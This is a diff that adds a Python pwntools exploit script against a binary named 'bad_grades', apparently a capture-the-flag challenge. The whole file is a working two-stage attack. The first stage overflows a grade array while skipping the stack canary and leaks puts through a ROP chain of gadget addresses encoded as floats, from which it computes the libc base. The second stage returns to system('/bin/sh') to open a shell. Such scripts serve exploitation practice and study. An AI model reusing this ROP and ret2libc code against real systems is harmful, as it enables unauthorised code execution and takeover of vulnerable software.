@@ -1,0 +1,77 @@
+from pwn import *
+import struct 
+p = process('./bad_grades')
+pid = gdb.attach(p, gdbscript="""
+           b * 0x4010ec
+      """)
+def send_grade(grade):
+    p.sendlineafter(': ', str(grade))
+
+
+#p.sendlineafter('> ','2')
+
+#p.sendlineafter(': ', '33')
+#send_grade('-')
+#send_grade('2')
+#for e in range(33):
+#    send_grade('-')
+#payload = 33+canary+rbp+poprdiret+puts@got+puts@plt+main = 39
+def exploit():
+
+    #leak 
+    p.sendlineafter('> ','2')
+    p.sendlineafter(': ', '39')
+    for e in range(33):
+        send_grade(e)
+    send_grade('-')
+    send_grade(1)
+    send_grade(2.0745866000000000*10**-317)
+    #00601fa8
+    send_grade(3.1123957000000000*10**-317)
+    #00400680
+    send_grade(2.0730830000000000*10**-317)
+    #00401108
+    send_grade(2.0744150000000000*10**-317)
+    p.recvline()
+    leak = u64(p.recv(6).ljust(8,'\0'))
+    
+    libc_base = leak -0x080aa0
+    system = libc_base + 0x04f550
+    bin_sh = libc_base + 0x1b3e1a
+
+    #info block
+
+    print "leak(puts): "+ hex(leak)
+    print "libc base: " + hex(libc_base)
+    print "system@glibc: " +hex(system)
+    print "bin_sh@glibc: " +hex(bin_sh)
+    
+    #return to libc
+    #pop_rdi_ret+bin_sh+ret+system
+    p.sendlineafter('> ','2')
+    p.sendlineafter(': ', '39')
+    for e in range(33):
+        send_grade(e)
+    send_grade('-')
+    send_grade(1)
+    #pop_rdi
+    send_grade(2.0745866000000000*10**-317)
+    #bin_sh
+    bin_sh_float = str(struct.unpack('>d', binascii.unhexlify(hex(bin_sh).replace('0x','').rjust(16,'0')))[0])
+    bin_sh_float = float(bin_sh_float.replace('e-310',''))
+    print "bin_sh float: " + str(bin_sh_float)
+    send_grade(6.91831193378*10 ** -310)
+    #ret
+    send_grade(2.0730703000000000*10**-317)
+    #system
+    
+    system_float = str(struct.unpack('>d', binascii.unhexlify(hex(system).replace('0x','').rjust(16,'0')))[0])
+    system_float = float(system_float.replace('e-310',''))
+    print "system float: "+str(system_float)
+
+    send_grade(system_float * 10 ** -310)
+
+exploit()
+p.interactive()
+
+
